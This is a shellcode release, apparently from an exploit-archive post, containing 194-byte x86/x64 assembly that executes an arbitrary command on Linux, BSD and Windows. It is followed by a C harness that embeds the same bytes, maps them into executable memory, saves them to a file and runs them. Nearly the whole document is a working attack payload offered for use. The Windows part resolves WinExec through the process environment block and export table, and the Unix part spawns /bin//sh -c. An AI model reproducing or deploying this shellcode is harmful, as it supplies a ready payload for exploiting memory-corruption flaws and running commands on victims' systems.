/**
    # Title : Execute command on Linux/Windows/BSD x86_64 execve("/bin//sh", {"//bin/sh", "-c", "cmd"}, NULL) shellcode
    # Date : 04-06-2016
    # Author : @odzhancode
    # Tested On : Debian x86/x64, FreeBSD x64, OpenBSD x64, Windows x86, Windows x64
*/

; **************************************
;  exec.asm
;
;  Execute a command
;  Works on 32/64-bit versions of Windows and Linux, 64-bit versions of FreeBSD/OpenBSD
;
;  yasm -fbin exec.asm -oexec.bin
;  nasm -fbin exec.asm -oexec.bin
;
;  194 bytes
;
    bits    32

    push    esi
    push    edi
    push    ebx
    push    ebp

    xor     ecx, ecx          ; ecx=0
    mul     ecx               ; eax=0, edx=0

    push    eax
    push    eax
    push    eax
    push    eax
    push    eax               ; setup homespace for win64
    jmp     l_sb              ; load command

get_os:
    pop     edi               ; edi=cmd, argv
    mov     cl, 7
    ; initialize cmd/argv regardless of OS
    push    eax               ; argv[3]=NULL;
    push    edi               ; argv[2]=cmd
    repnz   scasb             ; skip command line
    stosb                     ; zero terminate
    push    edi               ; argv[1]="-c", 0
    scasw                     ; skip option
    stosb                     ; zero terminate
    push    edi               ; argv[0]="/bin//sh", 0
    push    esp               ; save argv
    push    edi               ; save pointer to "/bin//sh", 0

    mov     al, 6             ; eax=sys_close for Linux/BSD
    inc     ecx               ; ignored on x64
    jecxz   gos_x64           ; if ecx==0 we're 64-bit

    ; we're 32-bit
    ; if gs is zero, we're native 32-bit windows
    mov     cx, gs
    jecxz   win_cmd

    ; if eax is zero after right shift of SP, ASSUME we're on windows
    push    esp
    pop     eax
    shr     eax, 24
    jz      win_cmd

    ; we're 32-bit Linux
    mov     al, 11            ; eax=sys_execve
    pop     ebx               ; ebx="/bin//sh", 0
    pop     ecx               ; ecx=argv
    int     0x80

    ; we're 64-bit, execute syscall and see what
    ; error returned
gos_x64:
    push    -1
    pop     edi
    syscall
    cmp     al, 5             ; Access Violation indicates windows
    push    59
    pop     eax
    cdq
    jz      win_cmd

    pop     edi               ; rdi="/bin//sh", 0
    pop     esi               ; rsi=argv
    syscall
l_sb:
    jmp     ld_cmd
    ; following code is derived from Peter Ferrie's calc shellcode
    ; i've modified it to execute commands
win_cmd:
    pop     eax               ; eax="/bin//sh", 0
    pop     eax               ; eax=argv
    pop     eax               ; eax="/bin//sh", 0
    pop     eax               ; eax="-c", 0
    pop     ecx               ; ecx=cmd
    pop     eax               ; eax=0

    inc     eax
    xchg    edx, eax
    jz      x64

    push    eax               ; will hide
    push    ecx               ; cmd

    mov     esi, [fs:edx+2fh]
    mov     esi, [esi+0ch]
    mov     esi, [esi+0ch]
    lodsd
    mov     esi, [eax]
    mov     edi, [esi+18h]
    mov     dl, 50h
    jmp     lqe
    bits 64
x64:
    mov     dl, 60h
    mov     rsi, [gs:rdx]
    mov     rsi, [rsi+18h]
    mov     rsi, [rsi+10h]
    lodsq
    mov     rsi, [rax]
    mov     rdi, [rsi+30h]
lqe:
    add     edx, [rdi+3ch]
    mov     ebx, [rdi+rdx+28h]
    mov     esi, [rdi+rbx+20h]
    add     rsi, rdi
    mov     edx, [rdi+rbx+24h]
fwe:
    movzx   ebp, word [rdi+rdx]
    lea     rdx, [rdx+2]
    lodsd
    cmp     dword [rdi+rax], 'WinE'
    jne     fwe

    mov     esi, [rdi+rbx+1ch]
    add     rsi, rdi

    mov     esi, [rsi+rbp*4]
    add     rdi, rsi
    cdq
    call    rdi
cmd_end:
    bits    32
    pop     eax
    pop     eax
    pop     eax
    pop     eax
    pop     eax
    pop     ebp
    pop     ebx
    pop     edi
    pop     esi
    ret
ld_cmd:
    call   get_os
    ; place command here
    ;db     "notepad", 0xFF
    ; do not change anything below
    ;db      "-c", 0xFF, "/bin//sh", 0

// *************** xcmd.c

/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#if defined (_WIN32) || defined(_WIN64)
#define WIN
#include <windows.h>
#else
#include <sys/mman.h>
#endif

#define CMD_LEN_OFS 0x10+1
#define EXEC_SIZE 194

char exec[]= {
  /* 0000 */ "\x56"                         /* push esi                        */
  /* 0001 */ "\x57"                         /* push edi                        */
  /* 0002 */ "\x53"                         /* push ebx                        */
  /* 0003 */ "\x55"                         /* push ebp                        */
  /* 0004 */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 0006 */ "\xf7\xe1"                     /* mul ecx                         */
  /* 0008 */ "\x50"                         /* push eax                        */
  /* 0009 */ "\x50"                         /* push eax                        */
  /* 000A */ "\x50"                         /* push eax                        */
  /* 000B */ "\x50"                         /* push eax                        */
  /* 000C */ "\x50"                         /* push eax                        */
  /* 000D */ "\xeb\x37"                     /* jmp 0x46                        */
  /* 000F */ "\x5f"                         /* pop edi                         */
  /* 0010 */ "\xb1\x00"                     /* mov cl, 0x0                     */
  /* 0012 */ "\x50"                         /* push eax                        */
  /* 0013 */ "\x57"                         /* push edi                        */
  /* 0014 */ "\xf2\xae"                     /* repne scasb                     */
  /* 0016 */ "\xaa"                         /* stosb                           */
  /* 0017 */ "\x57"                         /* push edi                        */
  /* 0018 */ "\x66\xaf"                     /* scasw                           */
  /* 001A */ "\xaa"                         /* stosb                           */
  /* 001B */ "\x57"                         /* push edi                        */
  /* 001C */ "\x54"                         /* push esp                        */
  /* 001D */ "\x57"                         /* push edi                        */
  /* 001E */ "\xb0\x06"                     /* mov al, 0x6                     */
  /* 0020 */ "\x41"                         /* inc ecx                         */
  /* 0021 */ "\xe3\x12"                     /* jecxz 0x35                      */
  /* 0023 */ "\x66\x8c\xe9"                 /* mov cx, gs                      */
  /* 0026 */ "\xe3\x20"                     /* jecxz 0x48                      */
  /* 0028 */ "\x54"                         /* push esp                        */
  /* 0029 */ "\x58"                         /* pop eax                         */
  /* 002A */ "\xc1\xe8\x18"                 /* shr eax, 0x18                   */
  /* 002D */ "\x74\x19"                     /* jz 0x48                         */
  /* 002F */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 0031 */ "\x5b"                         /* pop ebx                         */
  /* 0032 */ "\x59"                         /* pop ecx                         */
  /* 0033 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0035 */ "\x6a\xff"                     /* push 0xffffffff                 */
  /* 0037 */ "\x5f"                         /* pop edi                         */
  /* 0038 */ "\x0f\x05"                     /* syscall                         */
  /* 003A */ "\x3c\x05"                     /* cmp al, 0x5                     */
  /* 003C */ "\x6a\x3b"                     /* push 0x3b                       */
  /* 003E */ "\x58"                         /* pop eax                         */
  /* 003F */ "\x99"                         /* cdq                             */
  /* 0040 */ "\x74\x06"                     /* jz 0x48                         */
  /* 0042 */ "\x5f"                         /* pop edi                         */
  /* 0043 */ "\x5e"                         /* pop esi                         */
  /* 0044 */ "\x0f\x05"                     /* syscall                         */
  /* 0046 */ "\xeb\x75"                     /* jmp 0xbd                        */
  /* 0048 */ "\x58"                         /* pop eax                         */
  /* 0049 */ "\x58"                         /* pop eax                         */
  /* 004A */ "\x58"                         /* pop eax                         */
  /* 004B */ "\x58"                         /* pop eax                         */
  /* 004C */ "\x59"                         /* pop ecx                         */
  /* 004D */ "\x58"                         /* pop eax                         */
  /* 004E */ "\x40"                         /* inc eax                         */
  /* 004F */ "\x92"                         /* xchg edx, eax                   */
  /* 0050 */ "\x74\x16"                     /* jz 0x68                         */
  /* 0052 */ "\x50"                         /* push eax                        */
  /* 0053 */ "\x51"                         /* push ecx                        */
  /* 0054 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:edx+0x2f]          */
  /* 0058 */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
  /* 005B */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
  /* 005E */ "\xad"                         /* lodsd                           */
  /* 005F */ "\x8b\x30"                     /* mov esi, [eax]                  */
  /* 0061 */ "\x8b\x7e\x18"                 /* mov edi, [esi+0x18]             */
  /* 0064 */ "\xb2\x50"                     /* mov dl, 0x50                    */
  /* 0066 */ "\xeb\x17"                     /* jmp 0x7f                        */
  /* 0068 */ "\xb2\x60"                     /* mov dl, 0x60                    */
  /* 006A */ "\x65\x48"                     /* dec eax                         */
  /* 006C */ "\x8b\x32"                     /* mov esi, [edx]                  */
  /* 006E */ "\x48"                         /* dec eax                         */
  /* 006F */ "\x8b\x76\x18"                 /* mov esi, [esi+0x18]             */
  /* 0072 */ "\x48"                         /* dec eax                         */
  /* 0073 */ "\x8b\x76\x10"                 /* mov esi, [esi+0x10]             */
  /* 0076 */ "\x48"                         /* dec eax                         */
  /* 0077 */ "\xad"                         /* lodsd                           */
  /* 0078 */ "\x48"                         /* dec eax                         */
  /* 0079 */ "\x8b\x30"                     /* mov esi, [eax]                  */
  /* 007B */ "\x48"                         /* dec eax                         */
  /* 007C */ "\x8b\x7e\x30"                 /* mov edi, [esi+0x30]             */
  /* 007F */ "\x03\x57\x3c"                 /* add edx, [edi+0x3c]             */
  /* 0082 */ "\x8b\x5c\x17\x28"             /* mov ebx, [edi+edx+0x28]         */
  /* 0086 */ "\x8b\x74\x1f\x20"             /* mov esi, [edi+ebx+0x20]         */
  /* 008A */ "\x48"                         /* dec eax                         */
  /* 008B */ "\x01\xfe"                     /* add esi, edi                    */
  /* 008D */ "\x8b\x54\x1f\x24"             /* mov edx, [edi+ebx+0x24]         */
  /* 0091 */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [edi+edx]       */
  /* 0095 */ "\x48"                         /* dec eax                         */
  /* 0096 */ "\x8d\x52\x02"                 /* lea edx, [edx+0x2]              */
  /* 0099 */ "\xad"                         /* lodsd                           */
  /* 009A */ "\x81\x3c\x07\x57\x69\x6e\x45" /* cmp dword [edi+eax], 0x456e6957 */
  /* 00A1 */ "\x75\xee"                     /* jnz 0x91                        */
  /* 00A3 */ "\x8b\x74\x1f\x1c"             /* mov esi, [edi+ebx+0x1c]         */
  /* 00A7 */ "\x48"                         /* dec eax                         */
  /* 00A8 */ "\x01\xfe"                     /* add esi, edi                    */
  /* 00AA */ "\x8b\x34\xae"                 /* mov esi, [esi+ebp*4]            */
  /* 00AD */ "\x48"                         /* dec eax                         */
  /* 00AE */ "\x01\xf7"                     /* add edi, esi                    */
  /* 00B0 */ "\x99"                         /* cdq                             */
  /* 00B1 */ "\xff\xd7"                     /* call edi                        */
  /* 00B3 */ "\x58"                         /* pop eax                         */
  /* 00B4 */ "\x58"                         /* pop eax                         */
  /* 00B5 */ "\x58"                         /* pop eax                         */
  /* 00B6 */ "\x58"                         /* pop eax                         */
  /* 00B7 */ "\x58"                         /* pop eax                         */
  /* 00B8 */ "\x5d"                         /* pop ebp                         */
  /* 00B9 */ "\x5b"                         /* pop ebx                         */
  /* 00BA */ "\x5f"                         /* pop edi                         */
  /* 00BB */ "\x5e"                         /* pop esi                         */
  /* 00BC */ "\xc3"                         /* ret                             */
  /* 00BD */ "\xe8\x4d\xff\xff\xff"         /* call 0xf                        */
};

// save code to binary file
void bin2file (uint8_t bin[], size_t len)
{
  FILE *out=fopen ("sh_cmd.bin", "wb");
  if (out!=NULL)
  {
    fwrite (bin, 1, len, out);
    fclose (out);
  }
}
// allocate read/write and executable memory
// copy data from code and execute
void xcode(void *code, size_t code_len, char *cmd, size_t cmd_len)
{
  void *bin;
  uint8_t *p;
  char args[]="\xFF-c\xFF/bin//sh\x00";
  size_t arg_len;

  arg_len=strlen(args) + 1;

  printf ("[ executing code...\n");

#ifdef WIN
  bin=VirtualAlloc (0, code_len + cmd_len + arg_len,
    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
#else
  bin=mmap (0, code_len + cmd_len + arg_len,
    PROT_EXEC | PROT_WRITE | PROT_READ,
    MAP_ANON  | MAP_PRIVATE, -1, 0);
#endif
  if (bin!=NULL)
  {
    p=(uint8_t*)bin;

    memcpy (p, code, code_len);
    // set the cmd length
    p[CMD_LEN_OFS] = (uint8_t)cmd_len;
    // copy cmd
    memcpy ((void*)&p[code_len], cmd, cmd_len);
    // copy argv
    memcpy ((void*)&p[code_len+cmd_len], args, arg_len);

    //DebugBreak();
    bin2file(bin, code_len+cmd_len+arg_len);

    // execute
    ((void(*)())bin)();

#ifdef WIN
    VirtualFree (bin, code_len+cmd_len+arg_len, MEM_RELEASE);
#else
    munmap (bin, code_len+cmd_len+arg_len);
#endif
  }
}

int main(int argc, char *argv[])
{
    size_t len;
    char   *cmd;

    if (argc != 2) {
      printf ("\n  usage: xcmd <command>\n");
      return 0;
    }

    cmd=argv[1];
    len=strlen(cmd);

    if (len==0 || len>255) {
      printf ("\n  invalid command length: %i (must be between 1 and 255)", len);
      return 0;
    }

    xcode(exec, EXEC_SIZE, cmd, len);

    return 0;
}